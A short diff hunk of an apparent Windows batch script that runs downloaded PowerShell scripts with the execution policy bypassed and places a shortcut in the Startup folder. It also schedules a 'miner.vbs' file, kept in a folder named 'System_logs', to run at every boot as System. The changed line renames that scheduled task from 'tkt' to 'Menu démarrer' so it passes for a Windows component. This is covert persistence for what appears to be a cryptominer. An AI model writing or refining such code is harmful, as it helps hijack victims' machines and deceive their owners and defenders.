@@ -93,7 +93,7 @@ powershell.exe -ExecutionPolicy Bypass -File raccourci.ps1
 powershell.exe -ExecutionPolicy Bypass -File dowload.ps1
 
 start powershell.exe -ExecutionPolicy Bypass -File dowload.ps1
-schtasks /create /tn "tkt" /tr "%USERPROFILE%\AppData\Roaming\System_logs\miner.vbs" /sc onstart /ru System
+schtasks /create /tn "Menu démarrer" /tr "%USERPROFILE%\AppData\Roaming\System_logs\miner.vbs" /sc onstart /ru System
 
 move C:\logs.lnk "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 
